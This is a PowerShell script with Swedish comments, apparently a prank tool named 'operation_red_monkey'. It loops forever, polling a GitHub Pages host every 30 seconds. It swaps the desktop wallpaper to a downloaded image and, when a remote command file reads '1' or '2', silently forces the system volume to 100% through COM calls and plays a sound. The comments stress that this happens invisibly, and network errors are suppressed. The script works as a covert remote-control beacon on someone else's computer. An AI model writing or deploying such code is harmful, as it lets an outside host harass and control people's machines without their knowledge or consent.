# Sökvägar till dina filer på GitHub Pages
$imageUrl = "https://jgerell.github.io/operation_red_monkey/wallpaper.jpg"
$commandUrl = "https://jgerell.github.io/operation_red_monkey/command.txt"

# Sökvägar för lokala filer (allt sparas i samma mapp som detta skript)
$downloadPath = "$PSScriptRoot\downloaded_wallpaper.jpg"
$currentWallpaperPath = "$PSScriptRoot\active_wallpaper.jpg"
$commandDownloadPath = "$PSScriptRoot\downloaded_command.txt"
$currentCommandPath = "$PSScriptRoot\active_command.txt"
$soundPath = "$PSScriptRoot\discord.wav"

# C#-kod som låter PowerShell prata direkt med Windows ljud- och bildsystem helt dolt
$csharpCode = @"
using System;
using System.Runtime.InteropServices;

[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {
    int f(); int g(); int h(); int i();
    int SetMasterVolumeLevelScalar(float fLevel, Guid pEventContext);
}
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice {
    int Activate(ref Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator {
    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
}
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }

public class SysTools {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    public static void SetVolume(float level) {
        IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)(new MMDeviceEnumeratorComObject());
        IMMDevice dev = null;
        enumerator.GetDefaultAudioEndpoint(0, 1, out dev);
        IAudioEndpointVolume epv = null;
        Guid epvid = typeof(IAudioEndpointVolume).GUID;
        dev.Activate(ref epvid, 23, 0, out epv);
        epv.SetMasterVolumeLevelScalar(level, Guid.Empty);
    }
}
"@
Add-Type -TypeDefinition $csharpCode

while ($true) {
    try {
        # 1. KONTROLLERA OCH UPPDATERA BAKGRUNDSBILD
        Invoke-WebRequest -Uri $imageUrl -OutFile $downloadPath -UseBasicParsing
        $shouldUpdateWallpaper = $false

        if (Test-Path $currentWallpaperPath) {
            $hashNewWall = (Get-FileHash $downloadPath).Hash
            $hashOldWall = (Get-FileHash $currentWallpaperPath).Hash
            if ($hashNewWall -ne $hashOldWall) { $shouldUpdateWallpaper = $true }
        } else {
            $shouldUpdateWallpaper = $true
        }

        if ($shouldUpdateWallpaper) {
            Copy-Item -Path $downloadPath -Destination $currentWallpaperPath -Force
            [SysTools]::SystemParametersInfo(0x0014, 0, $currentWallpaperPath, 0x01 -bor 0x02)
        }

        # 2. KONTROLLERA TEXTFIL FÖR LJUDKOMMANDON
        Invoke-WebRequest -Uri $commandUrl -OutFile $commandDownloadPath -UseBasicParsing
        $shouldCheckCommand = $false

        if (Test-Path $currentCommandPath) {
            $hashNewCmd = (Get-FileHash $commandDownloadPath).Hash
            $hashOldCmd = (Get-FileHash $currentCommandPath).Hash
            if ($hashNewCmd -ne $hashOldCmd) { $shouldCheckCommand = $true }
        } else {
            # Första gången skriptet startar sparar vi bara filen utan att spela ljud direkt
            Copy-Item -Path $commandDownloadPath -Destination $currentCommandPath -Force
        }

        if ($shouldCheckCommand) {
            # Läs texten i filen och ta bort eventuella osynliga radbrytningar
            $command = (Get-Content -Path $commandDownloadPath -Raw).Trim()

            if ($command -eq "1" -or $command -eq "2") {
                # Höj volymen till 100% helt osynligt utan popup-ruta
                [SysTools]::SetVolume(1.0)
                Start-Sleep -Milliseconds 500

                if ($command -eq "1") {
                    # Spela den lokala larm.wav-filen om den existerar
                    if (Test-Path $soundPath) {
                        $soundPlayer = New-Object System.Media.SoundPlayer
                        $soundPlayer.SoundLocation = $soundPath
                        $soundPlayer.Play()
                    }
                } elseif ($command -eq "2") {
                    # Spela Windows vanliga notifikationsljud (Exclamation)
                    [System.Media.SystemSounds]::Exclamation.Play()
                }
            }
            # Uppdatera den lokala kontrollfilen så kommandot bara körs en gång
            Copy-Item -Path $commandDownloadPath -Destination $currentCommandPath -Force
        }

    } catch {
        # Ignorera eventuella nätverksfel om datorn tappar internet tillfälligt
    }

    # Vänta 30 sekunder innan nästa kontroll av både bild och textfil
    Start-Sleep -Seconds 30
}